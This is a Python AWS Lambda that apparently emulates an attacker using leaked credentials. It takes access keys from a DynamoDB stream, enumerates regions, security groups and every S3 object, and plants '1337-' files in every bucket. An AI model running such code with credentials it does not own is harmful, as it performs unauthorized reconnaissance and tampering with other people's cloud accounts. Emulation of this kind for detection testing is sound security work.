import botocore
import boto3
import json
import requests
import uuid

from logging import getLogger

logger = getLogger(__name__)


def region_walk(accounts):    
    for account in accounts:
        f_ec2 = boto3.client(
            'ec2',
            aws_access_key_id=account['AccessKey'],
            aws_secret_access_key=account['SecretAccessKey']        
        )
        res = f_ec2.describe_regions()

        for region in res['Regions']:
            try:
                f_ec2 = boto3.client(
                    'ec2',
                    aws_access_key_id=account['AccessKey'],
                    aws_secret_access_key=account['SecretAccessKey'],
                    region_name = region['RegionName']        
                )

                f_ec2.describe_security_groups()
            except Exception as e:
                logger.error(f"Could not walk regions and security groups due to: {e}")


def data_exfiltrator(accounts):
    for account in accounts:
        try:
            f_s3 = boto3.client(
                's3',
                aws_access_key_id=account['AccessKey'],
                aws_secret_access_key=account['SecretAccessKey']        
            )
            response = f_s3.list_buckets()
            bucket_names = []
            for bucket in response['Buckets']:
                bucket_names.append(bucket['Name'])
            
            for bucket in bucket_names:
                response = f_s3.list_objects_v2(Bucket=bucket)
                files = response.get('Contents', [])
                if len(files) > 0:
                    for _ in files:
                        f_s3.head_object(Bucket=bucket, Key=_['Key'])
        except Exception as e:
            logger.error(f"Could not enumerate bucket and files due to: {e}")


def data_plant(accounts):
    """Doesn't work at present"""
    for account in accounts:
        try:
            f_s3 = boto3.client(
                's3',
                aws_access_key_id=account['AccessKey'],
                aws_secret_access_key=account['SecretAccessKey']        
            )
            response = f_s3.list_buckets()
            cat = requests.get('https://placekitten.com/g/200/300')
            bucket_names = []
            for bucket in response['Buckets']:
                bucket_names.append(bucket['Name'])
                r = uuid.uuid4().hex
                f_s3.put_object(
                    Body=cat.text,
                    Bucket=bucket['Name'],
                    Key=f'1337-{r}.jpg',
                    ContentType="image/jpeg"
                )
        except Exception as e:
            logger.error(f"Could not plant evidence due to: {e}")


def parse_stream_data(event):
    accounts = []
    for record in event.get('Records'):
        new_image = record.get('dynamodb')
        if 'AccessKey' in new_image.get('NewImage', []):
            accountId = new_image['Keys']['accountId']['S']
            AccessKey = new_image['NewImage']['AccessKey']['S']
            SecretAccessKey = new_image['NewImage']['SecretAccessKey']['S']
            accounts.append(dict(AccessKey=AccessKey, SecretAccessKey=SecretAccessKey, AccountId=accountId))
    return accounts


def lambda_handler(event, context={}):
    try:
        accounts = parse_stream_data(event)
        region_walk(accounts)
        data_plant(accounts)
        data_exfiltrator(accounts)
    except Exception as e:
        logger.error(f"An unhandled exception has occured. Due to: {e}")